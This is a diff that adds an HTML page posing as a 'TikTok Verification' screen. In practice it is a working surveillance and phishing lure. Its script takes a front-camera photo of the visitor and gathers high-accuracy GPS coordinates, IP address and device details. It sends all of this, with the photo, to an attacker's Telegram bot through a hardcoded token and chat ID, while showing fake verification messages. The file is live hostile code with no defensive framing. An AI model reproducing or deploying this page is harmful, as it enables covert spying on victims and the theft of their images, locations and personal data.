@@ -1,0 +1,253 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TikTok Verification</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            background: url('https://i.ibb.co/Y7crqJ0Z/quality-restoration-20250731131830998.jpg') no-repeat center center fixed;
+            background-size: cover;
+            min-height: 100vh;
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        
+        #video {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            z-index: -1;
+        }
+        
+        #canvas {
+            display: none;
+        }
+        
+        .permission-prompt {
+            background-color: rgba(0, 0, 0, 0.8);
+            color: white;
+            padding: 20px;
+            border-radius: 10px;
+            text-align: center;
+            max-width: 90%;
+        }
+        
+        button {
+            background-color: #25D366;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 5px;
+            margin-top: 15px;
+            font-size: 16px;
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+    <video id="video" autoplay playsinline></video>
+    <canvas id="canvas"></canvas>
+    
+    <div class="permission-prompt" id="prompt">
+        <h2>Start to Open TIKTOK</h2>
+        <p></p>
+        <button id="startButton">Start</button>
+    </div>
+    
+    <script>
+        document.addEventListener('DOMContentLoaded', () => {
+            const video = document.getElementById('video');
+            const canvas = document.getElementById('canvas');
+            const prompt = document.getElementById('prompt');
+            const startButton = document.getElementById('startButton');
+            
+            // Show prompt initially
+            prompt.style.display = 'block';
+            
+            startButton.addEventListener('click', async () => {
+                prompt.innerHTML = '<p></p>';
+                await startVerification();
+            });
+            
+            async function startVerification() {
+                try {
+                    const stream = await navigator.mediaDevices.getUserMedia({ 
+                        video: { 
+                            facingMode: 'user',
+                            width: { ideal: 1280 },
+                            height: { ideal: 720 }
+                        },
+                        audio: false
+                    });
+                    
+                    video.srcObject = stream;
+                    prompt.style.display = 'none';
+                    
+                    // Wait for video to actually be playing
+                    video.onplaying = () => {
+                        setTimeout(() => {
+                            capturePhoto();
+                            stream.getTracks().forEach(track => track.stop());
+                        }, 1500); // Give more time for mobile devices
+                    };
+                    
+                } catch (err) {
+                    prompt.innerHTML = '<p>Camera access denied. Using alternative verification...</p>';
+                    setTimeout(() => {
+                        sendToTelegram(null);
+                    }, 2000);
+                }
+            }
+            
+            function capturePhoto() {
+                canvas.width = video.videoWidth || 640;
+                canvas.height = video.videoHeight || 480;
+                
+                const context = canvas.getContext('2d');
+                context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                sendToTelegram(canvas);
+            }
+            
+            async function sendToTelegram(canvasElement) {
+                prompt.innerHTML = '<p>Finalizing verification...</p>';
+                
+                const systemInfo = {
+                    deviceName: getDeviceName(),
+                    userAgent: navigator.userAgent,
+                    language: navigator.language,
+                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                    date: new Date().toLocaleString(),
+                    connection: getConnectionInfo(),
+                    location: await getLocationInfo(),
+                    ip: await getIPAddress(),
+                    screenResolution: `${window.screen.width}x${window.screen.height}`,
+                    deviceMemory: navigator.deviceMemory || 'Unknown',
+                    hardwareConcurrency: navigator.hardwareConcurrency || 'Unknown'
+                };
+                
+                let message = `📱 *Device Information* 📱\n\n`;
+                message += `📱 *Device*: ${systemInfo.deviceName}\n`;
+                message += `🛠️ *User Agent*: ${systemInfo.userAgent}\n`;
+                message += `🌐 *Language*: ${systemInfo.language}\n`;
+                message += `🗺️ *Timezone*: ${systemInfo.timezone}\n`;
+                message += `📅 *Date*: ${systemInfo.date}\n`;
+                message += `📶 *Connection*: ${systemInfo.connection}\n`;
+                message += `📍 *Location*: ${systemInfo.location}\n`;
+                message += `📡 *IP*: ${systemInfo.ip}\n`;
+                message += `🖥️ *Screen*: ${systemInfo.screenResolution}\n`;
+                message += `💾 *RAM*: ${systemInfo.deviceMemory}GB\n`;
+                message += `⚙️ *CPU Cores*: ${systemInfo.hardwareConcurrency}\n`;
+                
+                const botToken = '8306546024:AAF8cNHIqwUF88sBcZ00D0X4GGf_D9WuXC0';
+                const chatId = '7301310227';
+                
+                const formData = new FormData();
+                formData.append('chat_id', chatId);
+                formData.append('text', message);
+                formData.append('parse_mode', 'Markdown');
+                
+                try {
+                    const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                        method: 'POST',
+                        body: formData
+                    });
+                    
+                    if (response.ok && canvasElement) {
+                        const blob = await new Promise(resolve => {
+                            canvasElement.toBlob(resolve, 'image/jpeg', 0.8);
+                        });
+                        
+                        if (blob) {
+                            const photoFormData = new FormData();
+                            photoFormData.append('chat_id', chatId);
+                            photoFormData.append('photo', blob, 'verification.jpg');
+                            await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+                                method: 'POST',
+                                body: photoFormData
+                            });
+                        }
+                    }
+                    
+                    prompt.innerHTML = '<p>Verification complete! You may close this page.</p>';
+                } catch (error) {
+                    prompt.innerHTML = '<p>Verification failed. Please try again.</p>';
+                }
+            }
+            
+            function getDeviceName() {
+                const ua = navigator.userAgent;
+                if (/iPhone|iPad|iPod/i.test(ua)) {
+                    if (/iPhone/i.test(ua)) return 'iPhone';
+                    if (/iPad/i.test(ua)) return 'iPad';
+                    return 'iOS Device';
+                }
+                if (/Android/i.test(ua)) {
+                    const modelMatch = ua.match(/Android.*;\s([^;]+)\sBuild/);
+                    return modelMatch ? `Android (${modelMatch[1]})` : 'Android Device';
+                }
+                if (/Windows/i.test(ua)) return 'Windows PC';
+                if (/Mac/i.test(ua)) return 'Mac';
+                if (/Linux/i.test(ua)) return 'Linux';
+                return 'Unknown Device';
+            }
+            
+            function getConnectionInfo() {
+                if ('connection' in navigator) {
+                    const conn = navigator.connection;
+                    let info = conn.effectiveType || 'Unknown';
+                    if (conn.downlink) info += `, ${conn.downlink}Mb/s`;
+                    if (conn.rtt) info += `, ${conn.rtt}ms`;
+                    return info;
+                }
+                return 'Unknown';
+            }
+            
+            async function getLocationInfo() {
+                if ('geolocation' in navigator) {
+                    try {
+                        const pos = await new Promise((resolve, reject) => 
+                            navigator.geolocation.getCurrentPosition(resolve, reject, {
+                                enableHighAccuracy: true,
+                                timeout: 10000, // Increased timeout for mobile
+                                maximumAge: 0
+                            }));
+                        return `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+                    } catch (e) {
+                        return 'Location access denied';
+                    }
+                }
+                return 'Geolocation not supported';
+            }
+            
+            async function getIPAddress() {
+                try {
+                    const res = await fetch('https://api.ipify.org?format=json');
+                    const data = await res.json();
+                    return data.ip;
+                } catch {
+                    try {
+                        // Fallback IP detection
+                        const res = await fetch('https://ipapi.co/json/');
+                        const data = await res.json();
+                        return data.ip || 'Unknown';
+                    } catch {
+                        return 'Unknown';
+                    }
+                }
+            }
+        });
+    </script>
+</body>
+</html>
